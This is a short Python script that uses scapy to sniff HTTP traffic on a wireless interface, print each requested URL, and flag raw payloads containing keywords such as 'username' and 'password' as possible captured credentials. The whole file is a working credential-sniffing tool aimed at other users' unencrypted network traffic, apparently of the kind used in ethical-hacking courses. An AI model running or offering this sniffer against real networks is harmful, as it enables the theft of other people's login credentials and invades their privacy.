#!usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffer)

def get_url(packet):
    urll = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    urll = str(urll)
    return urll

def login(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        load = str(load)
        keywords = ["username", "user", "email", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load



def process_sniffer(packet):
    if packet.haslayer(http.HTTPRequest):
        url=get_url(packet)
        print("[+] HTTP REQUEST >>>"+url)
        login_info=login(packet)
        if login_info:
            print("\n\n\n[+] POSSIBLE USERNAME/PASSWORD >>>"+login_info+"\n\n\n")


sniff("wlan0")